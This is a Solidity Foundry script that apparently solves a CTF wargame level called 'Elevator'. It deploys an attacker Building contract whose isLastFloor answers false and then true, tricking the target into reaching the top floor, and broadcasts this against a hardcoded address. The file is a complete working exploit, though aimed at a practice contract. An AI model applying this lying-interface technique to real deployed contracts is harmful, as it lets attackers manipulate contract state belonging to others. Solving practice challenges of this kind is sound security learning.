// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Broadcast} from "./helper/Broadcast.sol";
import {Elevator} from "../src/L11Elevator.sol";

contract Building {
    Elevator elevator = Elevator(0x18998c7E38ede4dF09cEec08E5372Bf8fe5719ea);
    bool public state;

    constructor() payable {}

    function attack() public {
        elevator.goTo(1);
    }

    function isLastFloor()
        /**
         * uint256 _floor
         */
        public
        returns (bool)
    {
        if (!state) {
            state = true;
            return false;
        } else {
            return true;
        }
    }
}

/**
 * @notice get to the top floor
 */
contract L11ElevatorAttack is Script, Broadcast {
    function run() public broadcast {
        Building building = new Building{value: 0.1 ether}();
        building.attack();
    }
}
